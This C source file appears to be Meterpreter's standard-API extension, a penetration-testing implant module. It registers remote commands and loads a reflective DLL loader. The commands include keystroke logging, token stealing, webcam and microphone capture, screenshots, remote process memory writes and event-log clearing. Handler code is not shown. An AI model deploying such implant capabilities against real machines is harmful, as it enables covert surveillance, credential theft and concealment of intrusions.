/*
 * This module provides access to the standard API of the machine in some
 * regards
 */
#include "precomp.h"
#include "common_metapi.h"

// Required so that use of the API works.
MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// General
extern DWORD request_general_channel_open(Remote *remote, Packet *packet);

Command customCommands[] =
{
	// General
	COMMAND_REQ(COMMAND_ID_CORE_CHANNEL_OPEN, request_general_channel_open),

	// Railgun
	COMMAND_REQ(COMMAND_ID_STDAPI_RAILGUN_API, request_railgun_api),
	COMMAND_REQ(COMMAND_ID_STDAPI_RAILGUN_API_MULTI, request_railgun_api_multi),
	COMMAND_REQ(COMMAND_ID_STDAPI_RAILGUN_MEMREAD, request_railgun_memread),
	COMMAND_REQ(COMMAND_ID_STDAPI_RAILGUN_MEMWRITE, request_railgun_memwrite),

	// Fs
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_LS, request_fs_ls),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_GETWD, request_fs_getwd),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_CHDIR, request_fs_chdir),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_MKDIR, request_fs_mkdir),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_DELETE_DIR, request_fs_delete_dir),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_DELETE_FILE, request_fs_delete_file),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_SEPARATOR, request_fs_separator),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_STAT, request_fs_stat),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_FILE_EXPAND_PATH, request_fs_file_expand_path),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_FILE_MOVE, request_fs_file_move),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_FILE_COPY, request_fs_file_copy),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_MD5, request_fs_md5),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_SHA1, request_fs_sha1),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_SEARCH, request_fs_search),
	COMMAND_REQ(COMMAND_ID_STDAPI_FS_MOUNT_SHOW, request_fs_mount_show),

	// Process
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_ATTACH, request_sys_process_attach),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_CLOSE, request_sys_process_close),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_EXECUTE, request_sys_process_execute),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_KILL, request_sys_process_kill),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_GET_PROCESSES, request_sys_process_get_processes),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_GETPID, request_sys_process_getpid),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_GET_INFO, request_sys_process_get_info),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_WAIT, request_sys_process_wait),

	// Image
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_IMAGE_LOAD, request_sys_process_image_load),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS, request_sys_process_image_get_proc_address),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_IMAGE_UNLOAD, request_sys_process_image_unload),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES, request_sys_process_image_get_images),

	// Memory
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_ALLOCATE, request_sys_process_memory_allocate),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_FREE, request_sys_process_memory_free),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_READ, request_sys_process_memory_read),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_WRITE, request_sys_process_memory_write),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_QUERY, request_sys_process_memory_query),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_PROTECT, request_sys_process_memory_protect),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_LOCK, request_sys_process_memory_lock),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_MEMORY_UNLOCK, request_sys_process_memory_unlock),

	// Thread
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_OPEN, request_sys_process_thread_open),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_CREATE, request_sys_process_thread_create),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_CLOSE, request_sys_process_thread_close),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_GET_THREADS, request_sys_process_thread_get_threads),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_SUSPEND, request_sys_process_thread_suspend),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_RESUME, request_sys_process_thread_resume),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_TERMINATE, request_sys_process_thread_terminate),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_QUERY_REGS, request_sys_process_thread_query_regs),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_PROCESS_THREAD_SET_REGS, request_sys_process_thread_set_regs),

	// Registry
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_CHECK_KEY_EXISTS, request_registry_check_key_exists),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_LOAD_KEY, request_registry_load_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_UNLOAD_KEY, request_registry_unload_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_OPEN_KEY, request_registry_open_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_OPEN_REMOTE_KEY, request_registry_open_remote_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_CREATE_KEY, request_registry_create_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_ENUM_KEY, request_registry_enum_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_DELETE_KEY, request_registry_delete_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_CLOSE_KEY, request_registry_close_key),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_SET_VALUE, request_registry_set_value),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_QUERY_VALUE, request_registry_query_value),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_QUERY_CLASS, request_registry_query_class),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_ENUM_VALUE, request_registry_enum_value),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_DELETE_VALUE, request_registry_delete_value),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_ENUM_KEY_DIRECT, request_registry_enum_key_direct),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_ENUM_VALUE_DIRECT, request_registry_enum_value_direct),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_QUERY_VALUE_DIRECT, request_registry_query_value_direct),
	COMMAND_REQ(COMMAND_ID_STDAPI_REGISTRY_SET_VALUE_DIRECT, request_registry_set_value_direct),

	// Sys/config
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_GETUID, request_sys_config_getuid),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_LOCALTIME, request_sys_config_localtime),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_SYSINFO, request_sys_config_sysinfo),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_REV2SELF, request_sys_config_rev2self),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_GETPRIVS, request_sys_config_getprivs),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_GETENV, request_sys_config_getenv),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_DRIVER_LIST, request_sys_config_driver_list),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_STEAL_TOKEN, request_sys_config_steal_token),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_DROP_TOKEN, request_sys_config_drop_token),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_CONFIG_GETSID, request_sys_config_getsid),

	// Net
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_GET_ROUTES, request_net_config_get_routes),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_ADD_ROUTE, request_net_config_add_route),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_REMOVE_ROUTE, request_net_config_remove_route),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_GET_INTERFACES, request_net_config_get_interfaces),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_GET_ARP_TABLE, request_net_config_get_arp_table),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_GET_NETSTAT, request_net_config_get_netstat),

	// Proxy
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_CONFIG_GET_PROXY, request_net_config_get_proxy_config),
	// Resolve
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_RESOLVE_HOST, request_resolve_host),
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_RESOLVE_HOSTS, request_resolve_hosts),

	// Socket
	COMMAND_REQ(COMMAND_ID_STDAPI_NET_SOCKET_TCP_SHUTDOWN, request_net_socket_tcp_shutdown),

	// UI
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_ENABLE_MOUSE, request_ui_enable_mouse),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_ENABLE_KEYBOARD, request_ui_enable_keyboard),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_GET_IDLE_TIME, request_ui_get_idle_time),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_START_KEYSCAN, request_ui_start_keyscan),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_STOP_KEYSCAN, request_ui_stop_keyscan),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_GET_KEYS_UTF8, request_ui_get_keys_utf8),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_DESKTOP_ENUM, request_ui_desktop_enum),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_DESKTOP_GET, request_ui_desktop_get),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_DESKTOP_SET, request_ui_desktop_set),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_DESKTOP_SCREENSHOT, request_ui_desktop_screenshot),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_SEND_KEYS, request_ui_send_keys),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_SEND_KEYEVENT, request_ui_send_keyevent),
	COMMAND_REQ(COMMAND_ID_STDAPI_UI_SEND_MOUSE, request_ui_send_mouse),

	// Event Log
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_OPEN, request_sys_eventlog_open),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_NUMRECORDS, request_sys_eventlog_numrecords),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_READ, request_sys_eventlog_read),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_OLDEST, request_sys_eventlog_oldest),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_CLEAR, request_sys_eventlog_clear),
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_EVENTLOG_CLOSE, request_sys_eventlog_close),

	// Power
	COMMAND_REQ(COMMAND_ID_STDAPI_SYS_POWER_EXITWINDOWS, request_sys_power_exitwindows),

	// Webcam
	COMMAND_REQ(COMMAND_ID_STDAPI_WEBCAM_LIST, request_webcam_list),
	COMMAND_REQ(COMMAND_ID_STDAPI_WEBCAM_START, request_webcam_start),
	COMMAND_REQ(COMMAND_ID_STDAPI_WEBCAM_GET_FRAME, request_webcam_get_frame),
	COMMAND_REQ(COMMAND_ID_STDAPI_WEBCAM_STOP, request_webcam_stop),

	// Audio
	COMMAND_REQ(COMMAND_ID_STDAPI_WEBCAM_AUDIO_RECORD, request_ui_record_mic),

	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote *remote)
{
	met_api = api;

	met_api->command.register_all( customCommands );

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all( customCommands );

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
